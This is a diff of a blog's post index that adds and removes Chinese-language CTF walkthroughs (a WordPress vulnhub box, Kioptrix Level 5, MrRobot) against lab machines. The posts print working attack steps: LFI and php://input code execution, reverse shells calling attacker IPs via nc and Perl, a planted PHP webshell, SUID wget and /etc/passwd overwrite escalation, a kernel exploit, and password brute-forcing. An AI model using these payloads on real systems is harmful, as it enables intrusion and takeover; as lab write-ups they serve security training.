+<p><img src="/picture/image-20250322114916400.png" alt="image-20250322114916400"></p>
+<p>可惜，rockyou 没跑出来，说明密码十分复杂</p>
+<p><img src="/picture/image-20250322115026326.png" alt="image-20250322115026326"></p>
+<p>既然是 wp 构建的，使用 wpscan 扫扫看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.33.108/wordpress --enumerate u,ap,at --disable-tls-checks</span><br></pre></td></tr></table></figure>
+
+<p>发现了一些目录：</p>
+<p><img src="/picture/image-20250322132718031.png" alt="image-20250322132718031"></p>
+<p>访问 readme ，只是一个下载引导页面</p>
+<p><img src="/picture/image-20250322132911433.png" alt="image-20250322132911433"></p>
+<p>再来看主题，为 twentysixteen Version: 2.0，提示似乎有点过时了</p>
+<p><img src="/picture/image-20250322133149081.png" alt="image-20250322133149081"></p>
+<p>去网上搜搜看对应版本是否有漏洞，可惜没有搜索到</p>
+<p>再来看插件，分别是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mail-masta version 1.0</span><br><span class="line">reflex-gallery Version: 3.1.3</span><br><span class="line">site-editor Version: 1.1.1</span><br><span class="line">slideshow-gallery Version: 1.4.6</span><br><span class="line">wp-easycart-data (?)</span><br><span class="line">wp-support-plus-responsive-ticket-system Version: 7.1.3</span><br><span class="line">wp-symposium Version: 15.1</span><br></pre></td></tr></table></figure>
+
+<p>我们一个一个来，先是 mail-masta ，幸运的是，在 <a href="https://www.exploit-db.com/exploits/40290">WordPress Plugin Mail Masta 1.0 - Local File Inclusion</a> 页面能找到对应版本漏洞利用代码，而且通过 wpscan 的扫描我们得知，该 wp 服务的文件上传路径是默认的 &#x2F;wp-content 目录，那么就可以直接利用代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/picture/image-20250322140134547.png" alt="image-20250322140134547"></p>
+<p>看看能不能包含 apache 服务日志：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/sites-enabled/000-default.conf</span><br></pre></td></tr></table></figure>
+
+<p>可以包含，那么就尝试 apache 日志包含，可惜失败了，尝试通过伪协议执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -d &quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot; &quot;http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://input&quot;</span><br></pre></td></tr></table></figure>
+
+<p>成功执行</p>
+<p><img src="/picture/image-20250322143747568.png" alt="image-20250322143747568"></p>
+<p>尝试反弹 shell </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -d &quot;&lt;?php system(&#x27;busybox nc 10.8.0.90 1234 -e /bin/bash&#x27;); ?&gt;&quot; &quot;http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://input&quot;</span><br></pre></td></tr></table></figure>
+
+<p>同时开启 nc 监听：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 1234</span><br></pre></td></tr></table></figure>
+
+<p>反弹成功</p>
+<p><img src="/picture/image-20250322144039742.png" alt="image-20250322144039742"></p>
+<p>在 &#x2F;home&#x2F;raj 目录下找到第一个 flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmlu</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250322172934353.png" alt="image-20250322172934353"></p>
+<p>接下来就是提权，在工作目录下的 &#x2F;html 目录中，发现可疑文件，意思是需要 ZIP 来解决</p>
+<p><img src="/picture/image-20250322145304048.png" alt="image-20250322145304048"></p>
+<p>本机编写接收程序，将 zip 文件上传到宿主机上</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> SimpleHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UploadHandler</span>(<span class="title class_ inherited__">SimpleHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        content_length = <span class="built_in">int</span>(self.headers[<span class="string">&#x27;Content-Length&#x27;</span>])</span><br><span class="line">        post_data = self.rfile.read(content_length)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;secret.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(post_data)</span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server = HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8000</span>), UploadHandler)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>
+
+<p>启动接受服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 upload_server.py</span><br></pre></td></tr></table></figure>
+
+<p>在目标主机上执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget --post-file=secret.zip --header=&quot;Content-Type: application/octet-stream&quot; http://172.16.33.108:8000/</span><br></pre></td></tr></table></figure>
+
+<p>接收成功，解压时发现需要密码</p>
+<p><img src="/picture/image-20250322153224623.png" alt="image-20250322153224623"></p>
+<p>将密码哈希保存为字典，使用 john 破译</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john secret.zip &gt; secret.txt  </span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt secret.txt</span><br></pre></td></tr></table></figure>
+
+<p>又没跑出密码，看来得在目标主机里找了（</p>
+<p><img src="/picture/image-20250322153600657.png" alt="image-20250322153600657"></p>
+<p>再来枚举其他信息，看看有什么文件具有 SUID 权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>看到了一个有趣的东西：</p>
+<p><img src="/picture/image-20250322181011381.png" alt="image-20250322181011381"></p>
+<p>尝试使用 wget 的 SUID 提权，由于需要写入文件，所以进入 tmp 目录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress$ <span class="built_in">cd</span> /tmp</span><br><span class="line">www-data@ubuntu:/tmp$ TF=$(<span class="built_in">mktemp</span>)</span><br><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">chmod</span> +x <span class="variable">$TF</span></span><br><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">echo</span> -e <span class="string">&#x27;#!/bin/sh -p\n/bin/sh -p 1&gt;&amp;0&#x27;</span> &gt;<span class="variable">$TF</span></span><br><span class="line">www-data@ubuntu:/tmp$ wget --use-askpass=<span class="variable">$TF</span> 0</span><br></pre></td></tr></table></figure>
+
+<p>利用成功</p>
+<p><img src="/picture/image-20250322181324853.png" alt="image-20250322181324853"></p>
+<p>接下来就是进入 root 目录获得最终 flag</p>
+ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line"><span class="comment"># cat proof.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250322181504137.png" alt="image-20250322181504137"></p>
+<p>或者可以使用 cp 命令</p>
+<p>将目标主机上的 &#x2F;etc&#x2F;passwd 文件内容拷贝至主机，生成已知的密码哈希（123）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ openssl passwd -1 123</span><br><span class="line">$1$/l/LdaOy<span class="variable">$E0kBkOBauSctDWdECVk9r</span>.</span><br></pre></td></tr></table></figure>
+
+<p>在本地生成 passwd 文件，通过 goshs 上传至目标主机 tmp 目录，将上传的 passwd 拷贝覆盖原 &#x2F;etc&#x2F;passwd ，最后经过 su 提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://10.8.0.90/passwd</span><br><span class="line">cp passwd /etc/passwd</span><br><span class="line">su # 输入密码 123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250322202054503.png" alt="image-20250322202054503"></p>
+<p>当然，直接 wget 覆盖 &#x2F;etc&#x2F;passwd 也可以</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.8.0.90/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 看来 secret.zip 是兔子洞，误导你的</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Kioptrix Level 1 Walkthrough</title>
     <url>/2025/04/10/Kioptrix%20Level%201/</url>
     <content><![CDATA[<h1 id="Kioptrix-Level-1-Walkthrough"><a href="#Kioptrix-Level-1-Walkthrough" class="headerlink" title="Kioptrix Level 1 Walkthrough"></a>Kioptrix Level 1 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Kioptrix: Level 1 (#1)</a></p>
@@ -626,6 +626,97 @@
 
 <p>提权成功</p>
 <p><img src="/picture/image-20250409195553008.png" alt="image-20250409195553008"></p>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kioptrix Level 5 Walkthrough</title>
+    <url>/2025/04/14/Kioptrix%20Level%205/</url>
+    <content><![CDATA[<h1 id="Kioptrix-Level-5-Walkthrough"><a href="#Kioptrix-Level-5-Walkthrough" class="headerlink" title="Kioptrix Level 5 Walkthrough"></a>Kioptrix Level 5 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">Kioptrix: 2014 (#5)</a></p>
+<p><img src="/picture/image-20250414184141580.png" alt="image-20250414184141580"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>目标主机启动后需要输入 <code>ufs:/dev/ada0p2</code></p>
+<p><img src="/picture/image-20250414183715240.png" alt="image-20250414183715240"></p>
+<p>才算登陆成功</p>
+<p><img src="/picture/image-20250414183846610.png" alt="image-20250414183846610"></p>
+<p>确定存活的主机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.186.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250414134614134.png" alt="image-20250414134614134"></p>
+<p>对目标 IP 进行端口发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.186.152</span><br></pre></td></tr></table></figure>
+
+<p>发现开放 80，8080 端口</p>
+<p><img src="/picture/image-20250414134537101.png" alt="image-20250414134537101"></p>
+<p>对开放的端口进行应用版本发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 80，8080 -A 192.168.186.152</span><br></pre></td></tr></table></figure>
+
+<p>80 和 8080 端口开放的服务版本是一样的，但是 8080 端口状态码是 403 Forbidden</p>
+<p><img src="/picture/image-20250414134749796.png" alt="image-20250414134749796"></p>
+<p>那先来看 80 端口，或许能从中找到为什么 8080 端口是 403 状态码</p>
+<p>进行目录扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.152</span><br></pre></td></tr></table></figure>
+
+<p>看起来没有发现什么有用的东西</p>
+<p><img src="/picture/image-20250414135036362.png" alt="image-20250414135036362"></p>
+<p>那就直接访问页面，在源码中发现新的目录 &#x2F;pChart2.1.3&#x2F;index.php</p>
+<p><img src="/picture/image-20250414135131213.png" alt="image-20250414135131213"></p>
+<p>访问一下看看，发现被重定向到 &#x2F;pChart2.1.3&#x2F;examples&#x2F;index.php ，看起来 &#x2F;pChart2.1.3 是网站真正的目录，同时也暴露了该架构的版本为 2.1.3 </p>
+<p><img src="/picture/image-20250414135234747.png" alt="image-20250414135234747"></p>
+<p>去搜索一下对应版本是否存在漏洞，在 <a href="https://www.exploit-db.com/exploits/31173">pChart 2.1.3 - Multiple Vulnerabilities - PHP webapps Exploit</a> 中可以发现存在路径遍历漏洞</p>
+<p><img src="/picture/image-20250414135622413.png" alt="image-20250414135622413"></p>
+<p>利用成功，回显 &#x2F;etc&#x2F;passwd ，同时泄露操作系统版本</p>
+<p><img src="/picture/image-20250414140103044.png" alt="image-20250414140103044"></p>
+<p>由于是 Apache 作为 WEB 服务器，那我们可以尝试使用默认路径读取 FreeBSD 的 Apache 配置文件</p>
+<p><img src="/picture/image-20250414140253529.png" alt="image-20250414140253529"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.186.152/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f../usr/local/etc/apache22/httpd.conf</span><br></pre></td></tr></table></figure>
+
+<p>包含成功，发现要访问 8080 需要特定的 User-Agent</p>
+<p><img src="/picture/image-20250414140356111.png" alt="image-20250414140356111"></p>
+<p>开启 burp 拦截，将 User-Agent 更改为 Mozilla&#x2F;4.0 ，发现 phptax 目录</p>
+<p><img src="/picture/image-20250414150134654.png" alt="image-20250414150134654"></p>
+<p>搜索 phptax 有关漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit phptax</span><br></pre></td></tr></table></figure>
+
+<p>发现三个有关 payload</p>
+<p><img src="/picture/image-20250414175813001.png" alt="image-20250414175813001"></p>
+<p>在 中能发现漏洞利用过程，先使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$url&#125;/index.php?field=rce.php&amp;newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E</span><br></pre></td></tr></table></figure>
+
+<p>在目标主机 &#x2F;tmp 目录创建 rce.php ，之后使用 cmd 参数命令执行</p>
+<p><img src="/picture/image-20250414175930362.png" alt="image-20250414175930362"></p>
+<p>利用成功</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.186.152:8080/phptax/data/rce.php?cmd=id</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250414183044909.png" alt="image-20250414183044909"></p>
+<p>尝试反弹 shell </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.186.152:8080/phptax/data/rce.php?cmd=perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;192.168.186.141:8023&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>成功获得回弹的 shell</p>
+<p><img src="/picture/image-20250414180217399.png" alt="image-20250414180217399"></p>
+<p>由于目标主机不包含 python ，不能升级 TTY shell</p>
+<p>查看内核版本发现是 FreeBSD 9.0 ，存在内核提权漏洞</p>
+<p><img src="/picture/image-20250414180438132.png" alt="image-20250414180438132"></p>
+<p>将 exp 下载至本机，由于目标主机没有 wget 命令，但是有 nc 命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">which nc</span><br><span class="line">/usr/bin/nc</span><br></pre></td></tr></table></figure>
+
+<p> 使用 nc 传输文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 本机</span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nc -nvlp 8888 &lt; 28718.c  </span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">connect to [192.168.186.141] from (UNKNOWN) [192.168.186.152] 41152</span><br><span class="line"></span><br><span class="line"># 目标主机</span><br><span class="line">nc -nv 192.168.186.141 8888 &gt; 28718.c</span><br><span class="line"></span><br><span class="line">ls -la</span><br><span class="line">total 128</span><br><span class="line">drwxrwxrwx   9 www  wheel    512 Apr 14 06:10 .</span><br><span class="line">drwxrwxrwx   8 www  wheel    512 Mar 28  2014 ..</span><br><span class="line">drwxrwxrwx  12 www  wheel    512 May  7  2003 1040</span><br><span class="line">-rw-r--r--   1 www  wheel   5563 Apr 14 06:09 28718.c</span><br><span class="line">drwxrwxrwx   2 www  wheel    512 May  7  2003 SchA</span><br><span class="line">drwxrwxrwx   2 www  wheel    512 May  7  2003 SchB</span><br><span class="line">drwxrwxrwx   6 www  wheel    512 May  7  2003 SchD</span><br><span class="line">drwxrwxrwx   4 www  wheel    512 May  7  2003 SchD1</span><br><span class="line">drwxrwxrwx   7 www  wheel    512 May  7  2003 W2</span><br><span class="line">drwxrwxrwx   2 www  wheel   1536 Mar 26  2014 pdf</span><br><span class="line">-rw-r--r--   1 www  wheel     29 Apr 14 05:34 rce.php</span><br><span class="line">-rw-r--r--   1 www  wheel     29 Apr 14 05:45 shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250414182258978.png" alt="image-20250414182258978"></p>
+<p>使用目标主机自带 gcc 编译并赋予可执行权限，执行获得 root 权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc gcc 28718.c -o exp</span><br><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250414181411716.png" alt="image-20250414181411716"></p>
+<p>获得 flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -la /root</span><br><span class="line">cat /root/congrats.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250414181815671.png" alt="image-20250414181815671"></p>
 ]]></content>
       <categories>
         <category>Penetration Testing</category>
@@ -760,206 +851,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MrRobot Walkthrough</title>
-    <url>/2025/04/07/MrRobot/</url>
-    <content><![CDATA[<h1 id="MrRobot-Walkthrough"><a href="#MrRobot-Walkthrough" class="headerlink" title="MrRobot Walkthrough"></a>MrRobot Walkthrough</h1><h2 id="box-info"><a href="#box-info" class="headerlink" title="box info"></a>box info</h2><p>靶机地址：<a href="https://tryhackme.com/room/mrrobot">Mr Robot CTF</a></p>
-<p>This is a virtual machine meant for beginners&#x2F;intermediate users. There are 3 hidden keys located on the machine, can you find them?</p>
-<p><img src="/picture/image-20250317180740734.png" alt="image-20250317180740734"></p>
-<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- -Pn 10.10.173.41</span><br></pre></td></tr></table></figure>
-
-<p>发现开放的 80 和 443 端口</p>
-<p><img src="/picture/image-20250317174827626.png" alt="image-20250317174827626"></p>
-<p>先来看 HTTP 和 HTTPS 服务，80 端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p80 -A -Pn 10.10.173.41</span><br></pre></td></tr></table></figure>
-
-<p>未扫描出 apache 版本，暂不考虑从 apache 版本漏洞下手</p>
-<p><img src="/picture/image-20250317175001101.png" alt="image-20250317175001101"></p>
-<p>443 端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p443 -A -Pn 10.10.173.41</span><br></pre></td></tr></table></figure>
-
-<p>也未扫描出 apache 版本</p>
-<p><img src="/picture/image-20250317175433693.png" alt="image-20250317175433693"></p>
-<p>对 HTTP 服务进行目录扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.10.173.41/ -w /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure>
-
-<p>发现 robots.txt 同时还发现很多以 wp 开头的目录，猜测是 WordPress 构建的网站</p>
-<p><img src="/picture/image-20250317181555893.png" alt="image-20250317181555893"></p>
-<p>访问 robots.txt 发现第一个 key 同时发现隐藏目录 fsocity.dic </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">fsocity.dic</span><br><span class="line">key-1-of-3.txt</span><br></pre></td></tr></table></figure>
-
-<p>访问 &#x2F;key-1-of-3.txt 就能得到第一个 key </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">073403c8a58a1f80d943455fb30724b9</span><br></pre></td></tr></table></figure>
-
-<p>访问 fsocity.dic 能看到诸如 username、password 等字样，似乎是一个用户名和密码的字典</p>
-<p><img src="/picture/image-20250317182225086.png" alt="image-20250317182225086"></p>
-<p><img src="/picture/image-20250317182249643.png" alt="image-20250317182249643"></p>
-<p>将 fsocity.dic 下载至本地</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.173.41/fsocity.dic</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250317183249439.png" alt="image-20250317183249439"></p>
-<p>使用 ffuf 爆破后台密码：</p>
-<p>使用 burp 拦截，发现 username 和 password 以 POST 方式传输，同时 Cookie 不是动态刷新，也存在用户名枚举漏洞</p>
-<p><img src="/picture/image-20250317190217356.png" alt="image-20250317190217356"></p>
-<p>去除 fsocity.dic 中重复字段：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sort fsocity.dic | uniq &gt; fsocity_uniq.dic</span><br></pre></td></tr></table></figure>
-
-<p>将 request 保存为 request.txt ，使用 ffuf 爆破用户名（ fsocity_uniq.dic 字典较大，同时爆破用户名和密码要发送的数据过于巨大，大概千亿级 ）：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -request request.txt -w fsocity_uniq.dic:USER -fr &quot;Invalid username.&quot;</span><br></pre></td></tr></table></figure>
-
-<p>发现三个用户名：</p>
-<p><img src="/picture/image-20250317202629081.png" alt="image-20250317202629081"></p>
-<p>继续爆破密码，先尝试 <code>Elliot</code> ：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -request request.txt -w fsocity.dic:PASS -fr &quot;is incorrect.&quot;</span><br></pre></td></tr></table></figure>
-
-<p>运气不错，密码为 <code>ER28-0652</code></p>
-<p><img src="/picture/image-20250317201924308.png" alt="image-20250317201924308"></p>
-<p>成功进入后台：</p>
-<p><img src="/picture/image-20250317202800128.png" alt="image-20250317202800128"></p>
-<p>将 php-reverse-shell.php 拷贝至工作目录，并更改 IP 和端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/share/webshells/php/php-reverse-shell.php .</span><br><span class="line">vi php-reverse-shell.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250317203655296.png" alt="image-20250317203655296"></p>
-<p>再 plugins 的 add new 处上传</p>
-<p><img src="/picture/image-20250317203900422.png" alt="image-20250317203900422"></p>
-<p>再 Media 处就能看到上传到 php 文件及其所在地址：</p>
-<p><img src="/picture/image-20250317204004647.png" alt="image-20250317204004647"></p>
-<p><img src="/picture/image-20250317204154357.png" alt="image-20250317204154357"></p>
-<p>使用 nc 侦听 1234 端口，同时访问 PHP 所在网址</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 1234</span><br></pre></td></tr></table></figure>
-
-<p>成功 getshell ：</p>
-<p><img src="/picture/image-20250317204533213.png" alt="image-20250317204533213"></p>
-<p> 寻找 &#x2F;home 中用户的主目录，尝试寻找第二个 key</p>
-<p>最终在 &#x2F;home&#x2F;robot 目录中找到第二个 key ，只能 root 用户读取的 <code>key-2-of-3.txt</code> ，同时寻找到疑似 root 密码哈希</p>
-<p><img src="/picture/image-20250317205337671.png" alt="image-20250317205337671"></p>
-<p>使用 hashcat 的字典模式破解密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 0 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<p>密码为：<code>abcdefghijklmnopqrstuvwxyz</code></p>
-<p><img src="/picture/image-20250317210031810.png" alt="image-20250317210031810"></p>
-<p>直接登陆 robot 账户：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su robot</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250317210333682.png" alt="image-20250317210333682"></p>
-<p>获得 key 2 ：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">822c73956184f694993bede3eb39f959</span><br></pre></td></tr></table></figure>
-
-<p>接下来是提权，已知 robot 密码，确认是否有权通过 <code>sudo</code> 运行某些命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-
-<p>没有能执行 sudo 的命令</p>
-<p>查找具有 SUID 权限的文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">robot@linux:/$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/local/bin/nmap</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/pt_chown</span><br></pre></td></tr></table></figure>
-
-<p>除了 nmap ，其余的 su、sudo 都需要有权通过 <code>sudo</code> 运行</p>
-<p>使用 nmap 提权：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">robot@linux:/$ nmap --interactive</span><br><span class="line">nmap --interactive</span><br><span class="line"></span><br><span class="line">Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )</span><br><span class="line">Welcome to Interactive Mode -- press h &lt;enter&gt; <span class="keyword">for</span> <span class="built_in">help</span></span><br><span class="line">nmap&gt; !sh</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>切换至 &#x2F;root 目录并获得第三个 key</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line">total 32</span><br><span class="line">drwx------  3 root root 4096 Nov 13  2015 .</span><br><span class="line">drwxr-xr-x 22 root root 4096 Sep 16  2015 ..</span><br><span class="line">-rw-------  1 root root 4058 Nov 14  2015 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc</span><br><span class="line">drwx------  2 root root 4096 Nov 13  2015 .cache</span><br><span class="line">-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done</span><br><span class="line">-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt</span><br><span class="line">-rw-r--r--  1 root root  140 Feb 20  2014 .profile</span><br><span class="line">-rw-------  1 root root 1024 Sep 16  2015 .rnd</span><br><span class="line"><span class="comment"># cat key-3-of-3.txt</span></span><br><span class="line">04787ddef27c3dee1ee161b21670b4e4</span><br></pre></td></tr></table></figure>
-
-<h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p><img src="/picture/image-20250317212119153.png" alt="image-20250317212119153"></p>
-]]></content>
-      <categories>
-        <category>Penetration Testing</category>
-      </categories>
-      <tags>
-        <tag>Penetration Testing</tag>
-        <tag>THM</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kioptrix Level 5 Walkthrough</title>
-    <url>/2025/04/14/Kioptrix%20Level%205/</url>
-    <content><![CDATA[<h1 id="Kioptrix-Level-5-Walkthrough"><a href="#Kioptrix-Level-5-Walkthrough" class="headerlink" title="Kioptrix Level 5 Walkthrough"></a>Kioptrix Level 5 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">Kioptrix: 2014 (#5)</a></p>
-<p><img src="/picture/image-20250414184141580.png" alt="image-20250414184141580"></p>
-<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>目标主机启动后需要输入 <code>ufs:/dev/ada0p2</code></p>
-<p><img src="/picture/image-20250414183715240.png" alt="image-20250414183715240"></p>
-<p>才算登陆成功</p>
-<p><img src="/picture/image-20250414183846610.png" alt="image-20250414183846610"></p>
-<p>确定存活的主机</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.186.0/24</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250414134614134.png" alt="image-20250414134614134"></p>
-<p>对目标 IP 进行端口发现</p>
